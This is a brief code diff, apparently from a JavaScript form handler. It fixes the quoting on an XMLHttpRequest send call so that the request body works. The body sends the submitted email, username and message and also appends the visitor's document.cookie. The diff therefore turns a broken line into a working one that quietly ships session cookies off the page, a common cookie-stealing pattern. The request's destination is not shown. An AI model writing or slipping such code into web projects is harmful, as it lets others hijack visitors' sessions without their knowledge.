@@ -18,7 +18,7 @@ try{
 
 xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
 
-xhr.send(email=${email}&username=${username}&message=${message}&cookie=${document.cookie});
+xhr.send(`email=${email}&username=${username}&message=${message}&cookie=${document.cookie}`);
 xhr.onreadystatechange=()=>{
 }
             
